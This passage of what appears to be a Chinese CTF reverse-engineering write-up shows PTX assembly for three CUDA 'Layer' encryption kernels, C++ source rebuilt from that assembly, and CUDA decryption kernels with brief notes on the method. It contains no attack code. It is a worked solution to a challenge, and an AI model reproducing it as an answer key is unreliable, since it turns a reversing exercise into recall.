_Z6Layer1PhS__param_0,</span><br><span class="line">.param .u64 _Z6Layer1PhS__param_1</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">.reg .pred %p&lt;6&gt;;</span><br><span class="line">.reg .b16 %rs&lt;2&gt;;</span><br><span class="line">.reg .f32 %f&lt;12&gt;;</span><br><span class="line">.reg .b32 %r&lt;23&gt;;</span><br><span class="line">.reg .b64 %rd&lt;15&gt;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ld.param.u64 %rd5, [_Z6Layer1PhS__param_0];</span><br><span class="line">ld.param.u64 %rd6, [_Z6Layer1PhS__param_1];</span><br><span class="line">mov.u32 %r1, %tid.x;</span><br><span class="line">setp.lt.u32 %p1, %r1, 241;</span><br><span class="line">mov.u32 %r2, %ctaid.x;</span><br><span class="line">setp.lt.u32 %p2, %r2, 241;</span><br><span class="line">and.pred %p3, %p1, %p2;</span><br><span class="line">@%p3 bra $L__BB0_2;</span><br><span class="line">bra.uni $L__BB0_1;</span><br><span class="line"></span><br><span class="line">$L__BB0_2:</span><br><span class="line">mov.u32 %r3, %ntid.x;</span><br><span class="line">cvta.to.global.u64 %rd1, %rd5;</span><br><span class="line">mov.f32 %f10, 0f00000000;</span><br><span class="line">mov.u32 %r11, 0;</span><br><span class="line">mov.u64 %rd8, cuda_motion;</span><br><span class="line">mov.u32 %r20, %r11;</span><br><span class="line"></span><br><span class="line">$L__BB0_3:</span><br><span class="line">.pragma &quot;nounroll&quot;;</span><br><span class="line">add.s32 %r13, %r20, %r2;</span><br><span class="line">shl.b32 %r14, %r20, 4;</span><br><span class="line">mov.u32 %r15, 240;</span><br><span class="line">sub.s32 %r16, %r15, %r14;</span><br><span class="line">mad.lo.s32 %r21, %r13, %r3, %r1;</span><br><span class="line">mul.wide.u32 %rd7, %r16, 4;</span><br><span class="line">add.s64 %rd14, %rd8, %rd7;</span><br><span class="line">mov.u32 %r22, %r11;</span><br><span class="line"></span><br><span class="line">$L__BB0_4:</span><br><span class="line">.pragma &quot;nounroll&quot;;</span><br><span class="line">cvt.u64.u32 %rd9, %r21;</span><br><span class="line">add.s64 %rd10, %rd1, %rd9;</span><br><span class="line">ld.global.u8 %rs1, [%rd10];</span><br><span class="line">cvt.rn.f32.u16 %f7, %rs1;</span><br><span class="line">ld.const.f32 %f8, [%rd14];</span><br><span class="line">fma.rn.f32 %f10, %f8, %f7, %f10;</span><br><span class="line">add.s32 %r21, %r21, 1;</span><br><span class="line">add.s64 %rd14, %rd14, 4;</span><br><span class="line">add.s32 %r22, %r22, 1;</span><br><span class="line">setp.ne.s32 %p4, %r22, 16;</span><br><span class="line">@%p4 bra $L__BB0_4;</span><br><span class="line"></span><br><span class="line">add.s32 %r20, %r20, 1;</span><br><span class="line">setp.lt.u32 %p5, %r20, 16;</span><br><span class="line">@%p5 bra $L__BB0_3;</span><br><span class="line">bra.uni $L__BB0_6;</span><br><span class="line"></span><br><span class="line">$L__BB0_1:</span><br><span class="line">mov.f32 %f10, 0f00000000;</span><br><span class="line"></span><br><span class="line">$L__BB0_6:</span><br><span class="line">cvt.rzi.u32.f32 %r17, %f10;</span><br><span class="line">mov.u32 %r18, %ntid.x;</span><br><span class="line">mad.lo.s32 %r19, %r2, %r18, %r1;</span><br><span class="line">cvt.u64.u32 %rd11, %r19;</span><br><span class="line">cvta.to.global.u64 %rd12, %rd6;</span><br><span class="line">add.s64 %rd13, %rd12, %rd11;</span><br><span class="line">st.global.u8 [%rd13], %r17;</span><br><span class="line">ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">//</span><br><span class="line">.visible .entry _Z6Layer2PhS_(</span><br><span class="line">.param .u64 _Z6Layer2PhS__param_0,</span><br><span class="line">.param .u64 _Z6Layer2PhS__param_1</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">.reg .b16 %rs&lt;2&gt;;</span><br><span class="line">.reg .b32 %r&lt;8&gt;;</span><br><span class="line">.reg .b64 %rd&lt;14&gt;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ld.param.u64 %rd1, [_Z6Layer2PhS__param_0];</span><br><span class="line">ld.param.u64 %rd2, [_Z6Layer2PhS__param_1];</span><br><span class="line">cvta.to.global.u64 %rd3, %rd2;</span><br><span class="line">cvta.to.global.u64 %rd4, %rd1;</span><br><span class="line">mov.u32 %r1, %ctaid.x;</span><br><span class="line">mov.u32 %r2, %ntid.x;</span><br><span class="line">mov.u32 %r3, %tid.x;</span><br><span class="line">mad.lo.s32 %r4, %r1, %r2, %r3;</span><br><span class="line">cvt.u64.u32 %rd5, %r4;</span><br><span class="line">add.s64 %rd6, %rd4, %rd5;</span><br><span class="line">ld.global.u8 %rs1, [%rd6];</span><br><span class="line">cvt.u64.u32 %rd7, %r3;</span><br><span class="line">mov.u64 %rd8, cuda_sbox;</span><br><span class="line">add.s64 %rd9, %rd8, %rd7;</span><br><span class="line">ld.const.u8 %r5, [%rd9];</span><br><span class="line">cvt.u64.u32 %rd10, %r1;</span><br><span class="line">add.s64 %rd11, %rd8, %rd10;</span><br><span class="line">ld.const.u8 %r6, [%rd11];</span><br><span class="line">mad.lo.s32 %r7, %r2, %r5, %r6;</span><br><span class="line">cvt.u64.u32 %rd12, %r7;</span><br><span class="line">add.s64 %rd13, %rd3, %rd12;</span><br><span class="line">st.global.u8 [%rd13], %rs1;</span><br><span class="line">ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">//</span><br><span class="line">.visible .entry _Z6Layer3PhS_(</span><br><span class="line">.param .u64 _Z6Layer3PhS__param_0,</span><br><span class="line">.param .u64 _Z6Layer3PhS__param_1</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">.reg .pred %p&lt;5&gt;;</span><br><span class="line">.reg .b16 %rs&lt;33&gt;;</span><br><span class="line">.reg .b32 %r&lt;52&gt;;</span><br><span class="line">.reg .b64 %rd&lt;24&gt;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ld.param.u64 %rd6, [_Z6Layer3PhS__param_0];</span><br><span class="line">ld.param.u64 %rd5, [_Z6Layer3PhS__param_1];</span><br><span class="line">mov.u32 %r21, %ntid.x;</span><br><span class="line">mov.u32 %r1, %ctaid.x;</span><br><span class="line">mul.lo.s32 %r49, %r1, %r21;</span><br><span class="line">mov.u32 %r3, %tid.x;</span><br><span class="line">add.s32 %r22, %r49, %r3;</span><br><span class="line">cvt.u64.u32 %rd1, %r22;</span><br><span class="line">cvta.to.global.u64 %rd2, %rd6;</span><br><span class="line">add.s64 %rd3, %rd2, %rd1;</span><br><span class="line">cvt.u16.u32 %rs8, %r3;</span><br><span class="line">cvt.u16.u32 %rs9, %r1;</span><br><span class="line">or.b16 %rs10, %rs9, %rs8;</span><br><span class="line">ld.global.u8 %rs11, [%rd3];</span><br><span class="line">xor.b16 %rs12, %rs11, %rs10;</span><br><span class="line">st.global.u8 [%rd3], %rs12;</span><br><span class="line">bar.sync 0;</span><br><span class="line">and.b32 %r23, %r3, 7;</span><br><span class="line">setp.ne.s32 %p1, %r23, 0;</span><br><span class="line">@%p1 bra $L__BB2_4;</span><br><span class="line"></span><br><span class="line">ld.global.u32 %r47, [%rd3+4];</span><br><span class="line">ld.global.u32 %r48, [%rd3];</span><br><span class="line">mov.u32 %r46, 1786956040;</span><br><span class="line">mov.u32 %r45, 0;</span><br><span class="line"></span><br><span class="line">$L__BB2_2:</span><br><span class="line">.pragma &quot;nounroll&quot;;</span><br><span class="line">shl.b32 %r26, %r48, 4;</span><br><span class="line">add.s32 %r27, %r26, 1386807340;</span><br><span class="line">shr.u32 %r28, %r48, 5;</span><br><span class="line">add.s32 %r29, %r28, 2007053320;</span><br><span class="line">xor.b32 %r30, %r29, %r27;</span><br><span class="line">add.s32 %r31, %r48, %r46;</span><br><span class="line">xor.b32 %r32, %r30, %r31;</span><br><span class="line">add.s32 %r47, %r32, %r47;</span><br><span class="line">shl.b32 %r33, %r47, 4;</span><br><span class="line">add.s32 %r34, %r33, 621668851;</span><br><span class="line">add.s32 %r35, %r46, %r47;</span><br><span class="line">xor.b32 %r36, %r34, %r35;</span><br><span class="line">shr.u32 %r37, %r47, 5;</span><br><span class="line">add.s32 %r38, %r37, -862448841;</span><br><span class="line">xor.b32 %r39, %r36, %r38;</span><br><span class="line">sub.s32 %r48, %r48, %r39;</span><br><span class="line">add.s32 %r46, %r46, -1708609273;</span><br><span class="line">add.s32 %r45, %r45, 1;</span><br><span class="line">setp.ne.s32 %p2, %r45, 3238567;</span><br><span class="line">@%p2 bra $L__BB2_2;</span><br><span class="line"></span><br><span class="line">st.global.u32 [%rd3], %r48;</span><br><span class="line">st.global.u32 [%rd3+4], %r47;</span><br><span class="line"></span><br><span class="line">$L__BB2_4:</span><br><span class="line">bar.sync 0;</span><br><span class="line">and.b16 %rs16, %rs9, %rs8;</span><br><span class="line">ld.global.u8 %rs17, [%rd3];</span><br><span class="line">xor.b16 %rs18, %rs17, %rs16;</span><br><span class="line">st.global.u8 [%rd3], %rs18;</span><br><span class="line">bar.sync 0;</span><br><span class="line">cvt.u64.u32 %rd7, %r3;</span><br><span class="line">mov.u64 %rd8, cuda_sbox;</span><br><span class="line">add.s64 %rd9, %rd8, %rd7;</span><br><span class="line">ld.const.u8 %rs31, [%rd9];</span><br><span class="line">cvta.to.global.u64 %rd4, %rd5;</span><br><span class="line">mov.u16 %rs32, 0;</span><br><span class="line">mov.u32 %r50, 0;</span><br><span class="line">mov.u64 %rd14, cuda_tbox;</span><br><span class="line"></span><br><span class="line">$L__BB2_5:</span><br><span class="line">.pragma &quot;nounroll&quot;;</span><br><span class="line">cvt.u64.u32 %rd10, %r49;</span><br><span class="line">add.s64 %rd11, %rd2, %rd10;</span><br><span class="line">cvt.u64.u16 %rd12, %rs31;</span><br><span class="line">and.b64 %rd13, %rd12, 255;</span><br><span class="line">add.s64 %rd15, %rd14, %rd13;</span><br><span class="line">ld.const.u8 %rs19, [%rd15];</span><br><span class="line">ld.global.u8 %rs20, [%rd11];</span><br><span class="line">mul.lo.s16 %rs21, %rs19, %rs20;</span><br><span class="line">add.s16 %rs32, %rs21, %rs32;</span><br><span class="line">mul.lo.s16 %rs22, %rs31, 5;</span><br><span class="line">add.s16 %rs31, %rs22, 17;</span><br><span class="line">add.s32 %r49, %r49, 1;</span><br><span class="line">add.s32 %r50, %r50, 1;</span><br><span class="line">setp.ne.s32 %p3, %r50, 256;</span><br><span class="line">@%p3 bra $L__BB2_5;</span><br><span class="line"></span><br><span class="line">xor.b32 %r18, %r1, %r3;</span><br><span class="line">mov.u32 %r51, 8;</span><br><span class="line"></span><br><span class="line">$L__BB2_7:</span><br><span class="line">.pragma &quot;nounroll&quot;;</span><br><span class="line">shl.b16 %rs23, %rs32, 3;</span><br><span class="line">and.b16 %rs24, %rs32, 224;</span><br><span class="line">shr.u16 %rs25, %rs24, 5;</span><br><span class="line">or.b16 %rs26, %rs25, %rs23;</span><br><span class="line">cvt.u32.u16 %r42, %rs26;</span><br><span class="line">mad.lo.s32 %r43, %r42, 13, %r18;</span><br><span class="line">and.b32 %r44, %r51, 255;</span><br><span class="line">cvt.u64.u32 %rd16, %r44;</span><br><span class="line">add.s64 %rd18, %rd14, %rd16;</span><br><span class="line">cvt.u16.u32 %rs27, %r43;</span><br><span class="line">ld.const.u8 %rs28, [%rd18];</span><br><span class="line">xor.b16 %rs29, %rs28, %rs27;</span><br><span class="line">cvt.u64.u16 %rd19, %rs29;</span><br><span class="line">and.b64 %rd20, %rd19, 255;</span><br><span class="line">add.s64 %rd22, %rd8, %rd20;</span><br><span class="line">ld.const.u8 %rs32, [%rd22];</span><br><span class="line">add.s32 %r51, %r51, 1;</span><br><span class="line">setp.ne.s32 %p4, %r51, 4137823;</span><br><span class="line">@%p4 bra $L__BB2_7;</span><br><span class="line"></span><br><span class="line">add.s64 %rd23, %rd4, %rd1;</span><br><span class="line">st.global.u8 [%rd23], %rs32;</span><br><span class="line">ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按ptx汇编逐行还原三个layer加密函数。</p><p>bar.sync 0;这几行汇编很重要，会让所有gpu线程都同步执行到这边才继续往下进行加密。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cuda_runtime.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;device_launch_parameters.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">__constant__ <span class="type">uint8_t</span> cuda_sbox[<span class="number">256</span>];</span><br><span class="line">__constant__ <span class="type">uint8_t</span> cuda_tbox[<span class="number">256</span>];</span><br><span class="line">__constant__ <span class="type">float</span> cuda_motion[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">Layer1</span><span class="params">(<span class="type">uint8_t</span>* Input, <span class="type">uint8_t</span>* Output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tid = threadIdx.x;</span><br><span class="line">    <span class="type">int</span> bid = blockIdx.x;</span><br><span class="line">    <span class="type">int</span> bdim = blockDim.x;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (tid &gt;= <span class="number">241</span> || bid &gt;= <span class="number">241</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">float</span> sum = <span class="number">0.f</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> Index = (i + bid) * bdim + (tid + j);</span><br><span class="line">            sum += cuda_motion[<span class="number">240</span> - (i * <span class="number">16</span>) + j] * (<span class="type">float</span>)(Input[Index]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Output[bid * bdim + tid] = (<span class="type">uint8_t</span>)(sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">Layer2</span><span class="params">(<span class="type">uint8_t</span>* Input, <span class="type">uint8_t</span>* Output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tid = threadIdx.x;</span><br><span class="line">    <span class="type">int</span> bid = blockIdx.x;</span><br><span class="line">    <span class="type">int</span> bdim = blockDim.x;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> Value = Input[bid * bdim + tid];</span><br><span class="line">    <span class="type">int</span> Index = bdim * cuda_sbox[tid] + cuda_sbox[bid];</span><br><span class="line">    Output[Index] = Value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">Layer3</span><span class="params">(<span class="type">uint8_t</span>* Input, <span class="type">uint8_t</span>* Output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tid = threadIdx.x;</span><br><span class="line">    <span class="type">int</span> bid = blockIdx.x;</span><br><span class="line">    <span class="type">int</span> bdim = blockDim.x;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> CurIndex = bdim * bid + tid;</span><br><span class="line"></span><br><span class="line">    Input[CurIndex] ^= tid | bid;</span><br><span class="line"></span><br><span class="line">    __syncthreads();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((CurIndex &amp; <span class="number">7</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v0 = *(<span class="type">uint32_t</span>*)(Input + CurIndex);</span><br><span class="line">        <span class="type">uint32_t</span> v1 = *(<span class="type">uint32_t</span>*)(Input + CurIndex + <span class="number">4</span>);</span><br><span class="line">        <span class="type">uint32_t</span> sum = <span class="number">1786956040</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3238567</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            v1 += ((v0 &lt;&lt; <span class="number">4</span>) + <span class="number">1386807340</span>) ^ ((v0 &gt;&gt; <span class="number">5</span>) + <span class="number">2007053320</span>) ^ (v0 + sum);</span><br><span class="line">            v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + <span class="number">621668851</span>) ^ ((v1 &gt;&gt; <span class="number">5</span>) - <span class="number">862448841</span>) ^ (v1 + sum);</span><br><span class="line">            sum += <span class="number">-1708609273</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        *(<span class="type">uint32_t</span>*)(Input + CurIndex) = v0;</span><br><span class="line">        *(<span class="type">uint32_t</span>*)(Input + CurIndex + <span class="number">4</span>) = v1;</span><br><span class="line">    &#125;</span><br><span class="line">    __syncthreads();</span><br><span class="line"></span><br><span class="line">    Input[CurIndex] ^= bid &amp; tid;</span><br><span class="line"></span><br><span class="line">    __syncthreads();</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> tmp = cuda_sbox[tid];</span><br><span class="line">    <span class="type">uint16_t</span> v = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        v += cuda_tbox[tmp &amp; <span class="number">0xff</span>] * Input[bid * bdim + i];</span><br><span class="line">        tmp = tmp * <span class="number">5</span> + <span class="number">17</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">8</span>; i &lt; <span class="number">4137823</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> tmp1 = (v &lt;&lt; <span class="number">3</span>) | ((v &amp; <span class="number">224</span>) &gt;&gt; <span class="number">5</span>);</span><br><span class="line">        <span class="type">int</span> tmp2 = tmp1 * <span class="number">13</span> + (tid ^ bid);</span><br><span class="line">        v = cuda_sbox[(cuda_tbox[i &amp; <span class="number">0xff</span>] ^ tmp2) &amp; <span class="number">0xff</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Output[CurIndex] = (<span class="type">uint8_t</span>)v;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写出Layer3和Layer2的解密函数，Layer1是运动模糊卷积算法，不可逆，只能最后用算法还原清晰点。</p><p>Layer3这边倒数第二个那个256的循环是在python用z3解，其余部分都直接用cuda代码解密即可。</p><p>底下用到的cuda_invsbox是sbox算出的逆sbox数据。</p><p>cuda解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">__constant__ <span class="type">uint8_t</span> cuda_sbox[<span class="number">256</span>];</span><br><span class="line">__constant__ <span class="type">uint8_t</span> cuda_tbox[<span class="number">256</span>];</span><br><span class="line">__constant__ <span class="type">uint8_t</span> cuda_invsbox[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">Re_Layer2</span><span class="params">(<span class="type">uint8_t</span>* Input, <span class="type">uint8_t</span>* Output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tid = threadIdx.x;</span><br><span class="line">    <span class="type">int</span> bid = blockIdx.x;</span><br><span class="line">    <span class="type">int</span> bdim = blockDim.x;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> oTid = cuda_invsbox[bid];</span><br><span class="line">    <span class="type">int</span> oBid = cuda_invsbox[tid];</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> Value = Input[bid * bdim + tid];</span><br><span class="line"></span><br><span class="line">    Output[oBid * bdim + oTid] = Value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">Re_Layer3_part1</span><span class="params">(<span class="type">uint8_t</span>* Input, <span class="type">uint8_t</span>* Output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tid = threadIdx.x;</span><br><span class="line">    <span class="type">int</span> bid = blockIdx.x;</span><br><span class="line">    <span class="type">int</span> bdim = blockDim.x;</span><br><span class="line">    <span class="type">int</span> CurIndex = bdim * bid + tid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0xC5为13的逆元</span></span><br><span class="line">    <span class="type">uint8_t</span> inv_13 = <span class="number">0xC5</span>;</span><br><span class="line">    <span class="type">uint16_t</span> v = Input[CurIndex];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">4137823</span> - <span class="number">1</span>; i &gt;= <span class="number">8</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        v = cuda_invsbox[v &amp; <span class="number">0xff</span>];</span><br><span class="line">        <span class="type">int</span> tmp2 = v ^ cuda_tbox[i &amp; <span class="number">0xff</span>];</span><br><span class="line">        <span class="type">int</span> tmp1 = ((tmp2 - (tid ^ bid)) * inv_13) &amp; <span class="number">0xff</span>;</span><br><span class="line">        v = (tmp1 &gt;&gt; <span class="number">3</span>) | (tmp1 &lt;&lt; <span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Output[CurIndex] = v &amp; <span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">Re_Layer3_part2</span><span class="params">(<span class="type">uint8_t</span>* Input, <span class="type">uint8_t</span>* Output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> tid = threadIdx.x;</span><br><span class="line">    <span class="type">int</span> bid = blockIdx.x;</span><br><span class="line">    <span class="type">int</span> bdim = blockDim.x;</span><br><span class="line">    <span class="type">int</span> CurIndex = bdim * bid + tid;</span><br><span class="line"></span><br><span class="line">    Input[CurIndex] ^= bid &amp; tid;</span><br><span class="line"></span><br><span class="line">    __syncthreads();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((CurIndex &amp; <span class="number">7</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v0 = *(<span class="type">uint32_t</span>*)(Input + CurIndex);</span><br><span class="line">        <span class="type">uint32_t</span> v1 = *(<span class="type">uint32_t</span>*)(Input + CurIndex + <span class="number">4</span>);</span><br><span class="line">        <span class="type">uint32_t</span> sum = <span class="number">1786956040</span> + (<span class="number">-1708609273</span>) * <span class="number">3238567</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3238567</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            sum -= <span class="number">-1708609273</span>;</span><br><span class="line">            v0 += ((v1 &lt;&lt; <span class="number">4</span>) + <span class="number">621668851</span>) ^ ((v1 &gt;&gt; <span class="number">5</span>) - <span class="number">862448841</span>) ^ (v1 + sum);</span><br><span class="line">            v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + <span class="number">1386807340</span>) ^ ((v0 &gt;&gt; <span class="number">5</span>) + <span class="number">2007053320</span>) ^ (v0 + sum);</span><br><span class="line">        &#125;</span><br><span class="line">        *(<span class="type">uint32_t</span>*)(Input + CurIndex) = v0;</span><br><span class="line">        *(<span class="type">uint32_t</span>*)(Input + CurIndex + <span class="number">4</span>) = v1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __syncthreads();</span><br><span class="line"></span><br><span class="line">    Input[CurIndex] ^= tid | bid;</span><br><span class="line"></span><br><span class="line">    Output[CurIndex] = Input[CurIndex];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一层Layer3解密代码调用部分，只先解密最后那个大循环，然后256循环部分转到python进行z3求解。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span 